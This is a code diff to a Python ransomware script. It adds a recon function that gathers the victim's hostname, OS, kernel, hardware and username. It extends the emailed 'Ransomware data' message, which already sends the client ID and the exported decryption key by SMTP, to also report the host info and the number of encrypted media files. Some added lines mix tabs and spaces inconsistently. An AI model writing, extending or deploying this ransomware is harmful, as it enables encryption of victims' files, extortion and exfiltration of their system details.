@@ -63,6 +63,20 @@ def Key_Ops_HTTP():
 	###---@---###
 ######################################---NOT IMPLEMENTED---######################################	
 
+#### NEW Function ###
+# Does some recon of the host system
+def recon():
+    osinfo = os.uname()
+    user = os.getlogin()
+    information = {
+            "osname": osinfo[0],
+            "hostname": osinfo[1],
+            "os_release": osinfo[2],
+            "kernel_version": osinfo[3],
+            "hardware": osinfo[4],
+            "user": user
+            }
+    return information
 
 
 def send_Key_SMTP():
@@ -74,7 +88,7 @@ def send_Key_SMTP():
 	FROM = USER
 	TO = ["address@gmail.com"] 		
 	SUBJECT = "Ransomware data: "+str(ts)
-	MESSAGE = """\Client ID: %s Decryption Key: %s """ % (ID, exKey)
+        MESSAGE = """\Client ID: %s Decryption Key: %s Host info: %s Number of encrypted files: %s""" % (ID, exKey, str(hostinfo), encrypted_count)
 	message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
 	try:              
 		server = smtplib.SMTP()
@@ -118,6 +132,7 @@ def single_arg_encrypt_file(in_filename):
     encrypt_file(key, in_filename)
 
 def select_files():
+    global encrypted_count
     
     ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
@@ -132,7 +147,8 @@ def select_files():
         for file in files:
             if file.endswith(tuple(ext)):
                 files_to_enc.append(os.path.join(root, file))
-
+    
+    encrypted_count = str(len(files_to_enc)) ## Get a count of the encrypted files
     # Parallelize execution of encryption function over four subprocesses
     pool = Pool(processes=4)
     pool.map(single_arg_encrypt_file, files_to_enc)
@@ -179,6 +195,7 @@ if __name__=="__main__":
 	if SMTP == True:
 		key = RSA.generate(2048)
 		exKey = key.exportKey('PEM')
+                hostinfo = recon()
 		send_Key_SMTP()
 	else:
 		Key_Ops_HTTP() # Not implemented
